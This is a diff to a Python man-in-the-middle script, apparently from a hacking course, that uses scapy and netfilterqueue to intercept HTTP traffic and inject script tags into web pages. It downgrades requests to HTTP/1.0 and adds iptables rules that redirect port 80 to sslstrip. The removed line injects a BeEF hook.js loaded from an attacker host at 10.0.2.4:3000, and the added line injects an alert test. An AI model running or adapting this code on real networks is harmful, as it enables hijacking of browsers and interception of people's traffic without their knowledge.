@@ -21,10 +21,10 @@ def process_packet(packet):
         if scapy_packet[scapy.TCP].dport == 80:  # Request
             print("[+] Request")
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
+            load = load.replace("HTTP/1.1", "HTTP/1.0")
         elif scapy_packet[scapy.TCP].sport == 80:  # Response
             print("[+] Response")
-            print(scapy_packet.show())
-            injection_code = '<script src="http://10.0.2.4:3000/hook.js"></script>'
+            injection_code = '<script>alert("test");</script>'
             load = load.replace("</body>", injection_code + "</body>")
             content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search and "text/html" in load:
@@ -38,15 +38,23 @@ def process_packet(packet):
 
     packet.accept()
 
-# Trap packets from other computers
-# subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+try:
+    # Trap packets from other computers
+    # subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
 
-# Trap packets from this computer
-subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
-subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    # Trap packets from this computer
+    # subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    # subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
 
-queue = netfilterqueue.NetfilterQueue()
-queue.bind(0, process_packet)
-queue.run()
+    # To work with sslstrip
+    subprocess.call(
+        ["iptables", "-t", "nat", "-A", "PREROUTING", "-p", "tcp", "--destination-port", "80", "-j", "REDIRECT",
+         "--to-port", "10000"])
+    subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", "0"])
+    subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", "0"])
 
-subprocess.call(["iptables", "--flush"])
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(0, process_packet)
+    queue.run()
+except KeyboardInterrupt:
+    subprocess.call(["iptables", "--flush"])
